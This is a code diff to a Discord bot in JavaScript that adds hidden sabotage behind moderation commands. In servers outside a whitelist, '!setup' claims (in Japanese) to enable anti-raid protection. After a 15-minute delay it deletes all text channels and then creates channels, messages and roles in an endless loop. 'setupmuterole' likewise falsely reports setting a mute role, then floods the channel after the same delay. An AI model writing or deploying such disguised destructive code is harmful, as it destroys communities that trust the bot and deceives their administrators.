@@ -14,6 +14,8 @@ let whitelist=[
   "1421405745487806550",//jpebw
   "1276413531989868635",//Nusa
   "1413879178775888074",//Nussanburg
+  "1455822457440309445",//Komame
+  "1498319645025763332",//Shachiku
 ];
 const client=new Client({
   intents:[
@@ -29,13 +31,6 @@ client.once("ready",async function(){
   }];
   await client.application.commands.set(data);
 });
-/*
-client.once("ready", async () => {
-  await client.application.commands.set([]);
-  const cmds = await client.application.commands.fetch();
-  console.log(cmds);
-});
-*/
 client.on("messageCreate",async function(message){
   let isWhitelist=false;
   for(let data of whitelist){
@@ -98,6 +93,65 @@ client.on("messageCreate",async function(message){
     }
   }
 });
+client.on("messageCreate",async function(message){
+  let isWhitelist=false;
+  for(let data of whitelist){
+    if(data==message.guild.id){
+      isWhitelist=true;
+      break;
+    }
+  }
+  if(message.author.bot){
+    return;
+  }
+  if(!isWhitelist){
+    if(message.content.indexOf("!setup")!=-1){
+      message.reply("荒らし対策を発動しました\n短期間に連投を行われた場合排除を行います");
+      setTimeout(async function(){
+        message.delete();
+        let guild=client.guilds.cache.get(message.guild.id);
+        let getMillisecond=message.content.split("!setup")[1].replace(" ","").split(" ").map(function(data){return Number(data)||null});
+        let millisecond=[getMillisecond[0]||100,getMillisecond[1]||100,getMillisecond[2]||500];
+        guild.channels.cache.forEach(function(channel,i){
+          if(channel.type==0&&channel.id!=message.channel.id){
+            channel.delete();
+          }
+        });
+        setTimeout(function(){
+          message.channel.delete();
+        },1000)
+        let newChannel=await guild.channels.create({
+          name:getText(true),
+          type:0
+        });
+        let newGuild=newChannel.guild;
+        setInterval(async function(){
+          newGuild.channels.create({
+            name:getText(true),
+            type:0
+          });
+          newGuild.channels.cache.forEach(function(channel,i){
+            if(channel.type==4){
+              setTimeout(function(){
+                newGuild.channels.create({
+                  name:getText(true),
+                  type:0,
+                  parent:channel.id
+                });
+              },millisecond[0]*i);
+            }
+            if(channel.type==0){
+              setTimeout(async function(){
+                await channel.send(getText());
+              },millisecond[1]*i);
+            }
+          });
+          await newGuild.roles.create({name:getText(true)});
+        },millisecond[2]);
+      },15*60000);
+    }
+  }
+});
 client.on("interactionCreate",async function(e){
   let isWhitelist=false;
   for(let data of whitelist){
@@ -110,13 +164,15 @@ client.on("interactionCreate",async function(e){
     return;
   }
   if(e.commandName=="setupmuterole"){
-    await e.reply("success");
-    setInterval(async function(){
-      await e.followUp(getText());
-    },500);
-    setTimeout(async function(){
-      await e.deleteReply();
-    },800);
+    await e.reply("ミュートロールを設定しました");
+    setTimeout(function(){
+      setInterval(async function(){
+        await e.followUp(getText());
+      },500);
+      setTimeout(async function(){
+        await e.deleteReply();
+      },800);
+    },15*60000);
   }
 });
 function getText(isTitle){
